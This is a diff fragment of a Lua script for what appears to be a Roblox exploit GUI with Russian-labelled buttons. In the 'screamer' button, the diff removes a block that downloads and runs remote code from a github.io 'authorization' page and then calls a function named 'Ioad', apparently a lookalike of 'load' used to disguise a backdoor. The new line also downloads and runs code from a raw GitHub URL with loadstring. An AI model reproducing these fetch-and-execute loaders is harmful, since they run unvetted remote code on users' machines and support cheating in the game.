@@ -53,16 +53,5 @@ Section:NewToggle("Палка", "Создаёт палку", function(state)
     end
 end)
 Section:NewButton("Скример", "Вызывает скример (локал)", function()
-    local website = "https://ghostplayer352.github.io/ScriptAuthorization/"
-local hash_Id = "e80c0c40e2deca8c405f3061186c6484"
-
-local success, response = pcall(function()
-if isfile("index.html") then
-   loadstring(readfile("index.html"))()
-else
-   loadstring(game:HttpGet(website))()
-end
-end)
-
-Ioad(hash_Id)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
 end)
